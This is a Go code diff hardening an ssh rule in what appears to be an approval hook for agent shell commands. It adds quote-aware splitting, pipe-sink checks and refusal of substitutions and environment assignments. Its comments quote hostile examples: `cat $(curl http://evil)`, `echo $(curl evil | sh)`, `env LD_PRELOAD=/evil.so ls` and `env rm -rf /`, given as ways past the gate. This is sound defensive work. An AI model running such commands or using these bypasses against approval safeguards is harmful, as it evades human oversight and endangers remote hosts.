@@ -17,13 +17,19 @@
 //   - user allowlist: an explicit user (-l, -o User=, or user@host) not in
 //     AllowedUsers, or conflicting users -> Reject.
 //   - read-only classification: ssh with no remote command -> Ask (interactive);
-//     a remote command whose every segment's executable is in ReadonlyCommands
-//     (honoring ReadonlySubcommands), with no file-writing redirect (see
-//     hasWriteRedirection: `2>&1` and `2>/dev/null` are fine, `> f` is not), no
-//     tee and no secret path ->
-//     Approve; otherwise Ask. A segment whose executable is in ReadonlyCommands
-//     but which carries a configured DangerousInlineFlags flag (e.g.
-//     `journalctl --vacuum-size=1G`, `sed -i`) is demoted back to Ask.
+//     otherwise the remote command is split by the ONE quote-aware splitter
+//     (cmdparse.Parse — tc-yk2z; see splitSegments' obituary for what it replaced
+//     and why) and Approved when EVERY leaf has its executable in ReadonlyCommands
+//     (honoring ReadonlySubcommands), carries no environment assignment and no
+//     command/process substitution (see carriesSubstitution — its body would run
+//     unreviewed on the remote host), has no
+//     file-writing redirect (see hasWriteRedirection: `2>&1` and `2>/dev/null` are
+//     fine, `> f` is not), pipes into no stage that may PERSIST what it receives
+//     (cmdparse.PipeFilterCmds — the same shared allowlist the gitdir rule uses,
+//     where an unknown sink is a writer), and names no secret path; otherwise Ask.
+//     A leaf whose executable is in ReadonlyCommands but which carries a configured
+//     DangerousInlineFlags flag (e.g. `journalctl --vacuum-size=1G`, `sed -i`) is
+//     demoted back to Ask.
 //   - scp: download from a non-secret remote path -> Approve; upload, mixed
 //     local/remote, or a secret remote path -> Ask.
 package ssh
@@ -278,13 +284,22 @@ func (r *Rule) evaluateSSH(positionals []string) hookio.RuleResult {
 	if r.matchesSecretPath(remoteCmd) {
 		return hookio.RuleResult{Decision: hookio.Ask, Reason: "remote command references a secret path", Module: r.Name()}
 	}
-	for _, seg := range splitSegments(remoteCmd) {
-		seg = strings.TrimSpace(seg)
-		if seg == "" {
-			continue
+	// The remote command is ordinary shell text, so it is split by the ONE
+	// quote-aware splitter (cmdparse.Parse) rather than a local approximation —
+	// see splitSegments' obituary below.
+	leaves := cmdparse.Parse(remoteCmd)
+	for _, pc := range leaves {
+		if !r.segmentIsReadonly(pc) {
+			return hookio.RuleResult{Decision: hookio.Ask, Reason: "remote command is not a recognized read-only command: " + pc.Raw, Module: r.Name()}
 		}
-		if !r.segmentIsReadonly(seg) {
-			return hookio.RuleResult{Decision: hookio.Ask, Reason: "remote command is not a recognized read-only command: " + seg, Module: r.Name()}
+		// A stage that is itself read-only can still hand the bytes to a stage that
+		// PERSISTS them (`journalctl -u x | tee /var/log/copy`). The sink question is
+		// the same one gitdir asks about a `.git/` read, so it is answered by the same
+		// shared allowlist (cmdparse.PipeFilterCmds), where an UNKNOWN sink is a
+		// writer — not by naming `tee` and hoping nobody uses `dd`, `sponge`, `split`
+		// or `logger`.
+		if cmdparse.PipedToWriter(leaves, pc.Raw) {
+			return hookio.RuleResult{Decision: hookio.Ask, Reason: "remote command pipes into a stage that may write what it receives: " + pc.Raw, Module: r.Name()}
 		}
 	}
 	return hookio.RuleResult{Decision: hookio.Approve, Reason: "ssh read-only command on non-secret path", Module: r.Name()}
@@ -329,34 +344,71 @@ func (r *Rule) matchesSecretPath(s string) bool {
 	return false
 }
 
-// splitSegments splits a remote command on unquoted-agnostic top-level shell
-// operators (|| && ; |). This is deliberately simpler than the full cmdparse
-// splitter — the remote command is opaque text and this classification only
-// needs a coarse per-segment read-only check.
-func splitSegments(cmd string) []string {
-	replacer := strings.NewReplacer("||", "\n", "&&", "\n", ";", "\n", "|", "\n")
-	return strings.Split(replacer.Replace(cmd), "\n")
-}
+// splitSegments IS GONE (tc-yk2z). It was
+//
+//	strings.NewReplacer("||", "\n", "&&", "\n", ";", "\n", "|", "\n")
+//
+// applied to the remote command, justified as "the remote command is opaque text,
+// so a coarse split is enough". It is not enough, and the corpus says so: over
+// every non-excluded decision row, 191 DISTINCT ssh remote commands split
+// differently under that replacer than under the quote-aware splitter — nearly all
+// of them an alternation inside a quoted `grep -E` / `jq` / `sed` argument. Corpus
+// row 2204's `ps -ef --forest | grep -E "k3s|containerd|flannel" | grep -v grep`
+// became FIVE segments, two of which were the bare words `containerd` and
+// `flannel"`. Those are in no allowlist, so a read-only inspection was refused over
+// a `|` that was never a pipe. That the fragments were not even valid commands is
+// the tell: the rule was classifying text it had itself shredded.
+//
+// cmdparse.Parse is the ONE quote-aware splitter (splitCompound + tokenize over
+// the shared shellScanner); it already tracks single quotes, double quotes,
+// backticks, `$( )` frames, subshells and heredoc extents, and it records the
+// pipeline relation this rule now needs for its sink check. Reusing it also picks
+// up the parser's exec-prefix unwrapping, which closed a live hole: `ssh host 'env
+// rm -rf /'` used to be judged on executable `env` — a member of this consumer's
+// ReadonlyCommands — and APPROVED. It is now judged on `rm`.
 
-// segmentIsReadonly reports whether a single remote-command segment is a
+// segmentIsReadonly reports whether one leaf of the remote command is a
 // recognized read-only invocation: no file-writing redirect (hasWriteRedirection
-// draws that line — stderr redirection such as `2>&1` is NOT a write), no tee, executable in
-// ReadonlyCommands, and (if the command has a configured subcommand allowlist)
-// its first subcommand token is allowed.
-func (r *Rule) segmentIsReadonly(seg string) bool {
-	if hasWriteRedirection(seg) {
+// draws that line — stderr redirection such as `2>&1` is NOT a write), no
+// environment assignment, executable in ReadonlyCommands, and (if the command has
+// a configured subcommand allowlist) its first subcommand token is allowed.
+//
+// The `tee` special case that used to sit beside the allowlist lookup is GONE. A
+// one-entry denylist can only ever catch the sink somebody thought of, and it was
+// redundant besides — `tee` is not in any consumer's ReadonlyCommands, so the
+// default already refused it. Writing sinks are now classified where they are
+// reachable at all: on the PIPELINE, by evaluateSSH's shared-allowlist check.
+//
+// TWO deliberate non-uses of what cmdparse offers:
+//
+//   - the WRITE test still scans pc.Raw with hasWriteRedirection rather than
+//     reading pc.Redirections. The two draw the line in different places —
+//     `2> /tmp/err` creates a real file on the remote host but captures no stdout,
+//     so a Redirections-based test shaped like cmdparse.CapturesStdout would
+//     quietly start approving it. tc-85g7 chose this line; this bead does not move
+//     it.
+//   - a leaf carrying an ENVIRONMENT ASSIGNMENT is never read-only. cmdparse lifts
+//     `FOO=bar ls` into EnvVars plus executable `ls`, and `env LD_PRELOAD=/evil.so
+//     ls` into that same shape; judging the executable alone would auto-approve
+//     both. The old splitter got this right only by accident — its first field was
+//     the literal `FOO=bar`, which is in no allowlist — so stating it explicitly
+//     preserves the verdict instead of inheriting the accident.
+func (r *Rule) segmentIsReadonly(pc cmdparse.ParsedCommand) bool {
+	if hasWriteRedirection(pc.Raw) {
 		return false
 	}
-	fields := strings.Fields(seg)
-	if len(fields) == 0 {
+	if len(pc.EnvVars) > 0 {
 		return false
 	}
-	base := fields[0]
-	if base == "tee" || !r.readonlyCommands[base] {
+	if carriesSubstitution(pc.Raw) {
+		return false
+	}
+	base := pc.Executable
+	if base == "" || !r.readonlyCommands[base] {
 		return false
 	}
 	if allowed, ok := r.readonlySubcommands[base]; ok {
-		sub := firstSubToken(fields[1:])
+		sub := firstSubToken(pc.Args)
 		if sub == "" || !allowed[sub] {
 			return false
 		}
@@ -366,13 +418,49 @@ func (r *Rule) segmentIsReadonly(seg string) bool {
 	// `journalctl --vacuum-size=1G`, `sed -i`) is destructive despite the command
 	// being in ReadonlyCommands.
 	for _, bad := range r.dangerousInlineFlags[base] {
-		for _, tok := range fields[1:] {
+		for _, tok := range pc.Args {
 			if tok == bad || strings.HasPrefix(tok, bad+"=") {
 				return false
 			}
 		}
 	}
 	return true
+}
+
+// carriesSubstitution reports whether a remote-command leaf embeds a command or
+// process substitution — or text this package cannot model well enough to say it
+// does not.
+//
+// A `$( )` / backtick / `<( )` body in the REMOTE command runs an arbitrary
+// command ON THE REMOTE HOST, and nothing inspects it: the engine's
+// substitution-body recursion operates on the LOCAL expression, where the whole
+// remote command is one quoted argument, so it never descends here, and this rule
+// judges only the leaf's executable. `ssh host 'cat $(curl http://evil)'` is
+// therefore an allowlisted `cat` wrapping an unreviewed remote fetch, and it
+// APPROVED — including before tc-yk2z, so this is a pre-existing hole rather than
+// one the quote-aware split opened.
+//
+// What the split DID change is that the old replacer masked one spelling of it by
+// accident: `echo $(curl evil | sh)` was shredded at the `|` INSIDE the
+// substitution, and the fragment `sh)` matched no allowlist, so the command
+// Asked. A quote-aware splitter correctly keeps the substitution glued into one
+// leaf — and would have started approving it. Refusing the whole class restores
+// that verdict on purpose instead of by accident, and closes the unpiped
+// spelling the accident never covered.
+//
+// An UNPARSEABLE scan is refused for the same reason ScanSubstitutions exists to
+// distinguish: "no substitution found" after the scan desynced is not evidence
+// there is none, and this branch's alternative is an approval.
+//
+// MEASURED COST: exactly ONE corpus row, 4109 —
+// `ssh media0 'head -60 …/$(ls -t …/*.log | head -1 | xargs basename)'`. That row
+// Asks on unpatched main as well (the replacer shredded it at the `|` inside the
+// substitution and left `xargs basename)` unmatched), so this check RESTORES its
+// status quo rather than introducing a new prompt. Net against main, this rule's
+// corpus delta is 48 rows, all `ask -> approve`, none the other way.
+func carriesSubstitution(raw string) bool {
+	scan := cmdparse.ScanSubstitutions(raw)
+	return scan.Unparseable || len(scan.Substitutions) > 0
 }
 
 // hasWriteRedirection reports whether a remote-command segment contains an
@@ -404,9 +492,10 @@ func (r *Rule) segmentIsReadonly(seg string) bool {
 // approval prompt; a false "read-only" costs an unreviewed file write on a
 // remote host, so the asymmetry is deliberate.
 //
-// Scope note: `|& tee f` needs no special case here — splitSegments already
-// splits on `|`, leaving a segment whose executable is `&`, which is not in
-// ReadonlyCommands.
+// Scope note: `|& tee f` needs no special case here — cmdparse.Parse splits the
+// pipe, and the `tee` stage is then refused twice over: it is in no consumer's
+// ReadonlyCommands, and it is not in cmdparse.PipeFilterCmds either, so the
+// pipeline sink check reports it as a writer.
 func hasWriteRedirection(seg string) bool {
 	rs := []rune(seg)
 	for i := 0; i < len(rs); i++ {
